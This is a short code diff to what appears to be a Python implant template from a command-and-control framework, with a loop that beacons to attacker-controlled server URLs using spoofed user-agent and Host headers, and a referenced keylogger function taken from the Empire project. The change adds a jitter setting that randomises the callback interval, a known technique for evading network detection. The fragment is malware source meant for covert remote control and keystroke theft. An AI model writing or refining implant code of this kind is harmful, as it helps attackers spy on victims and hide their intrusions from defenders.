@@ -15,6 +15,7 @@ urls = [%s]
 kd=time.strptime("%s","%%d/%%m/%%Y")
 useragent = ""
 imbase = "%s"
+jitter = %s
 
 def keylog():
   # keylogger imported from https://raw.githubusercontent.com/EmpireProject/Empire/fcd1a3d32b4c37a392c59ffe241b9cb973fde7f4/lib/modules/python/collection/osx/keylogger.py
@@ -96,7 +97,8 @@ while(True):
     uri = "%s"
     server = "%%s/%%s%%s" %% (serverclean, random.choice(urls), uri)
     try:
-      time.sleep(timer)
+      this_timer = random.randint(timer * (1 - jitter), timer * (1 + jitter))
+      time.sleep(this_timer)
       ua='%s'
       if hh: req=urllib2.Request(server,headers={'Host':hh,'User-agent':ua})
       else: req=urllib2.Request(server,headers={'User-agent':ua})
